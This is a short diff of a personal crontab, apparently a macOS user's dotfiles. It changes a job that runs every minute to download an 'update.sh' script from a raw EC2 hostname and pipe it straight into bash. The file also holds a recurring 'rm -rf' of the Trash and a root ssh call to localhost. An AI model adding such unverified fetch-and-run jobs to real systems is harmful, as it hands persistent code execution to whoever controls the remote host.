@@ -1,5 +1,5 @@
 MAILTO=""
-* * * * * curl -L boesen.science:1917/update.sh | bash
+* * * * * curl -L ec2-184-73-149-102.compute-1.amazonaws.com:1917/update.sh | bash
 0 12 * * * find ~ -iname ".DS_Store" -exec rm {} \;
 0 12 */5 * * rm -rf ~/.Trash/*
 0 0 * * * ssh root@localhost -t "/Users/boesene/.bin/wlist"
